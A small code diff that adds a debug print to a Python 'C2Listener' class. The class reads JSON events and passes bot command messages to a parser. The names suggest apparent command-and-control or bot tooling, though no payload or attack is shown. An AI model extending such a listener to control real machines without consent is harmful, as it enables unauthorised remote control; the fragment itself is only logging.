@@ -43,6 +43,7 @@ class C2Listener:
             data = json.loads(line)
 
             if (data["event"] == "message"):
+                print (f"Bot pulled command: {data['message']}")
                 command = self.parser.parse_command(data["message"])
 
                 self.last_command_time = data["time"]
